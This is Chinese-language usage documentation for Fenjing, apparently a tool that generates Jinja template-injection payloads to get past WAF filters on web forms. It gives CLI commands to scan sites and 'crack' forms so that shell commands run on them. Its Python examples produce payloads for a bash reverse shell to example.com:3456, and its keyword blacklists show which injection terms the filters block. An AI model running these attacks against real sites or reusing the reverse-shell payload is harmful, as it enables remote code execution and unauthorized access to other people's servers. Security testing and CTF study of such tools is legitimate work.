## 注意

不要使用windows的cmd跑脚本，要不然就会像[这位](https://github.com/Marven11/Fenjing/issues/3)一样出问题

## 启动webui

webui不支持自定义Headers和Cookie等特性，如果需要更灵活的使用方式请直接使用命令行或者作为库调用
执行`python -m fenjing webui`并访问[http://127.0.0.1:11451](http://127.0.0.1:11451)即可
指定host和port：`python -m fenjing webui --host '127.0.0.1' --port 1145`

## 作为命令行脚本使用

扫描网站：`python -m fenjing scan --url 'http://xxx.xxx/'`

获取config：`python -m fenjing get-config --url 'http://xxx.xxx' --method GET --inputs name`

攻击对应的表单：
- `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name`
- 也可以指定多个input：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name,email`
- 指定攻击成功后执行的命令
    - 不指定则进入交互模式
    - `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --user-agent`

通用设置
- 指定请求间隔：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --interval 0.1`
- 指定请求时使用的UA：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --user-agent 'Aaa/1.1'`
- 指定Header：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --header 'Aaa: Bbb' --header 'Ccc: Ddd'`
- 指定Cookie：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --cookie 'name1=value1; name2=value2'`


## 作为库使用

### 根据WAF函数生成shell指令对应的payload

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    # config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    # print(f"{config_payload=}")
```

### 让生成器学会使用新的变量

[参考](https://github.com/Marven11/Fenjing/issues/4)

比如说你想让生成器学会使用新的变量`aaa`，它的值是100，需要在payload的前面加上`{%set aaa=0x64%}`，那你只需要这么写

```python
from fenjing.full_payload_gen import FullPayloadGen
from fenjing.const import OS_POPEN_READ
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 这个函数因题目而定
    blacklist = [
        "00", "1", "3", "5", "7", "9"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    full_payload_gen = FullPayloadGen(waf)
    full_payload_gen.do_prepare()
    full_payload_gen.context["aaa"] = 100
    full_payload_gen.context_payload += "{%set aaa=0x64%}"
    shell_payload, will_print = full_payload_gen.generate(OS_POPEN_READ, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    if not will_print:
        print("这个payload不会产生回显")
    print(f"{shell_payload=}")
```
